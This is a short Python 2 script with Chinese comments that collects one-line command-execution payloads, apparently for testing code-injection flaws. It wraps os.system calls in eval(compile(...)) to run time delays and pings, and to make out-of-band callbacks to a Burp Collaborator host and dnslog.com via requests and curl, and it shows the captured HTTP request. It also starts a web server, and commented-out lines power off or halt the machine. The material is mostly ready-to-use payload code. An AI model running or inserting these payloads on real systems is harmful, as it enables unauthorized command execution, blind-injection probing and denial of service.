#!/usr/bin/env python
# -*- coding: utf-8 -*-


# https://github.com/1135/python_demos
# 一句话执行命令
# python2 测试可用


import os
os.system('ls')
os.popen('ls').readlines()


#模块 （执行命令的参数或者返回中包含了中文文字，那么建议使用subprocess）
#import subprocess
#subprocess.call (["ls"],shell=True)


#延时
eval(compile('for x in range(1):\n import time\n time.sleep(5)','a','single'))


# range里面写几 就执行几次
eval(compile('for x in range(1):\n import time\n import os\n os.system(\'ping -c1 -W \' +str((x+1)*1000)+ \' baidu.com\')','a','single'))



#--------python自带函数


#利用requests发起请求  py不自带该库
eval(compile('for x in range(1):\n import requests\n requests.get(\'http://0qrr4fbj21mvaz6s860xixnn7ed41t.burpcollaborator.net\')','a','single'))

# GET / HTTP/1.1
# Host: 0qrr4fbj21mvaz6s860xixnn7ed41t.burpcollaborator.net
# Connection: keep-alive
# Accept-Encoding: gzip, deflate
# Accept: */*
# User-Agent: python-requests/2.22.0


#---------- 启动web服务器
eval(compile('import os\nos.system(\'python -m SimpleHTTPServer 8080\')'))

#-------windows下 调用cmd.exe执行
#执行http请求
# eval(compile('import os\nos.system(\'telnet www.dnslog.com 80\')'))

#-------linux下
#http请求
eval(compile('import os\nos.system(\'curl www.dnslog.com\')'))


# 立即关机
# eval(compile('import os\nos.system(\'poweroff\')'))

# 立即重启
# eval(compile('import os\nos.system(\'halt\')'))
